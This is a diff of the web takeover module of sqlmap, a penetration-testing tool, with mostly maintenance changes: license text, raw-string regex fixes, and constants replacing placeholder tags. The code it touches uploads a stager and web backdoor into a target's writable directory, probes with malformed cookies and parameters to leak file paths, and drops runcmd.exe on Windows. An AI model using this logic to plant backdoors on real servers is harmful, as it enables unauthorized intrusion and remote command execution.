@@ -1,8 +1,8 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
-See the file 'doc/COPYING' for copying permission
+Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)
+See the file 'LICENSE' for copying permission
 """
 
 import os
@@ -47,10 +47,11 @@ from lib.core.enums import WEB_API
 from lib.core.exception import SqlmapNoneDataException
 from lib.core.settings import BACKDOOR_RUN_CMD_TIMEOUT
 from lib.core.settings import EVENTVALIDATION_REGEX
+from lib.core.settings import SHELL_RUNCMD_EXE_TAG
+from lib.core.settings import SHELL_WRITABLE_DIR_TAG
 from lib.core.settings import VIEWSTATE_REGEX
 from lib.request.connect import Connect as Request
 from thirdparty.oset.pyoset import oset
-
 
 class Web:
     """
@@ -80,7 +81,7 @@ class Web:
         page, _, _ = Request.getPage(url=cmdUrl, direct=True, silent=True, timeout=BACKDOOR_RUN_CMD_TIMEOUT)
 
         if page is not None:
-            output = re.search("<pre>(.+?)</pre>", page, re.I | re.S)
+            output = re.search(r"<pre>(.+?)</pre>", page, re.I | re.S)
 
             if output:
                 output = output.group(1)
@@ -110,10 +111,10 @@ class Web:
 
         if self.webApi in getPublicTypeMembers(WEB_API, True):
             multipartParams = {
-                                "upload":    "1",
-                                "file":      stream,
-                                "uploadDir": directory,
-                              }
+                "upload": "1",
+                "file": stream,
+                "uploadDir": directory,
+            }
 
             if self.webApi == WEB_API.ASPX:
                 multipartParams['__EVENTVALIDATION'] = kb.data.__EVENTVALIDATION
@@ -134,7 +135,7 @@ class Web:
 
     def _webFileInject(self, fileContent, fileName, directory):
         outFile = posixpath.join(ntToPosixSlashes(directory), fileName)
-        uplQuery = getUnicode(fileContent).replace("WRITABLE_DIR", directory.replace('/', '\\\\') if Backend.isOs(OS.WINDOWS) else directory)
+        uplQuery = getUnicode(fileContent).replace(SHELL_WRITABLE_DIR_TAG, directory.replace('/', '\\\\') if Backend.isOs(OS.WINDOWS) else directory)
         query = ""
 
         if isTechniqueAvailable(kb.technique):
@@ -218,7 +219,7 @@ class Web:
                         finally:
                             been.add(url)
 
-                url = re.sub(r"(\.\w+)\Z", "~\g<1>", conf.url)
+                url = re.sub(r"(\.\w+)\Z", r"~\g<1>", conf.url)
                 if url not in been:
                     try:
                         page, _, _ = Request.getPage(url=url, raise404=False, silent=True)
@@ -230,7 +231,7 @@ class Web:
 
                 for place in (PLACE.GET, PLACE.POST):
                     if place in conf.parameters:
-                        value = re.sub(r"(\A|&)(\w+)=", "\g<2>[]=", conf.parameters[place])
+                        value = re.sub(r"(\A|&)(\w+)=", r"\g<2>[]=", conf.parameters[place])
                         if "[]" in value:
                             page, headers, _ = Request.queryPage(value=value, place=place, content=True, raise404=False, silent=True, noteResponseTime=False)
                             parseFilePaths(page)
@@ -242,12 +243,12 @@ class Web:
                     cookie = headers[HTTP_HEADER.SET_COOKIE]
 
                 if cookie:
-                    value = re.sub(r"(\A|;)(\w+)=[^;]*", "\g<2>=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", cookie)
+                    value = re.sub(r"(\A|;)(\w+)=[^;]*", r"\g<2>=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", cookie)
                     if value != cookie:
                         page, _, _ = Request.queryPage(value=value, place=PLACE.COOKIE, content=True, raise404=False, silent=True, noteResponseTime=False)
                         parseFilePaths(page)
 
-                    value = re.sub(r"(\A|;)(\w+)=[^;]*", "\g<2>=", cookie)
+                    value = re.sub(r"(\A|;)(\w+)=[^;]*", r"\g<2>=", cookie)
                     if value != cookie:
                         page, _, _ = Request.queryPage(value=value, place=PLACE.COOKIE, content=True, raise404=False, silent=True, noteResponseTime=False)
                         parseFilePaths(page)
@@ -257,6 +258,7 @@ class Web:
         directories = list(oset(directories))
 
         path = urlparse.urlparse(conf.url).path or '/'
+        path = re.sub(r"/[^/]*\.\w+\Z", '/', path)
         if path != '/':
             _ = []
             for directory in directories:
@@ -266,9 +268,9 @@ class Web:
             directories = _
 
         backdoorName = "tmpb%s.%s" % (randomStr(lowercase=True), self.webApi)
-        backdoorContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "backdoor.%s_" % self.webApi))
+        backdoorContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "backdoors", "backdoor.%s_" % self.webApi))
 
-        stagerContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "stager.%s_" % self.webApi))
+        stagerContent = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "stagers", "stager.%s_" % self.webApi))
 
         for directory in directories:
             if not directory:
@@ -323,8 +325,8 @@ class Web:
                     os.close(handle)
 
                     with open(filename, "w+b") as f:
-                        _ = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "stager.%s_" % self.webApi))
-                        _ = _.replace("WRITABLE_DIR", utf8encode(directory.replace('/', '\\\\') if Backend.isOs(OS.WINDOWS) else directory))
+                        _ = decloak(os.path.join(paths.SQLMAP_SHELL_PATH, "stagers", "stager.%s_" % self.webApi))
+                        _ = _.replace(SHELL_WRITABLE_DIR_TAG, utf8encode(directory.replace('/', '\\\\') if Backend.isOs(OS.WINDOWS) else directory))
                         f.write(_)
 
                     self.unionWriteFile(filename, self.webStagerFilePath, "text", forceCheck=True)
@@ -369,7 +371,7 @@ class Web:
                     continue
 
                 _ = "tmpe%s.exe" % randomStr(lowercase=True)
-                if self.webUpload(backdoorName, backdoorDirectory, content=backdoorContent.replace("WRITABLE_DIR", backdoorDirectory).replace("RUNCMD_EXE", _)):
+                if self.webUpload(backdoorName, backdoorDirectory, content=backdoorContent.replace(SHELL_WRITABLE_DIR_TAG, backdoorDirectory).replace(SHELL_RUNCMD_EXE_TAG, _)):
                     self.webUpload(_, backdoorDirectory, filepath=os.path.join(paths.SQLMAP_EXTRAS_PATH, "runcmd", "runcmd.exe_"))
                     self.webBackdoorUrl = "%s/Scripts/%s" % (self.webBaseUrl, backdoorName)
                     self.webDirectory = backdoorDirectory
